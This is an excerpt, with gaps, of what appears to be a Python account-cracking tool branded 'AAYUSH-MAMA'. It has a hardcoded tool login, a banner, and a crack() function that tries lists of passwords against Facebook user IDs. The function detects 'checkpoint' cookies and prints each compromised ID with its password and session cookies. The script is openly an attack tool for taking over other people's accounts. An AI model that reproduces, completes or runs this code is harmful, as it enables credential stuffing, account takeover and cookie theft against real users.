...
while attemps < 12345677901:
    ...
    if username == 'AAYUSH' and password == 'MAMA':
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • AUTHOR-AAYUSH+NISHAN
\033[0;92m • Tool Type-PREMIUM
\033[0;92m • Note - AAYUSH MAMA BHAN BHANJA HARU
  \033[0;92m═════════════════════════════════════════════ \033[1;31m""")
def login():
	banner()
	...
	if MAMA in ['m']:
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100077082091014&mibextid=ZbWKwL ')
	elif MAMA in ['0']:
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m ACTIVE FILE\n\x1b[1;97m [1] METHOD BHANJA.. ')
	os.system('espeak -a 300 " 1,  method,  BHANJA"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[AAYUSH-MAMA] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#MAMA-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•AAYUSH-MAMA-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#MAMA-King
				print(f'\r\033[0;92m[AAYUSH-MAMA-➼-OK] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " AAYUSH-MAMA,  Ok,  id"')
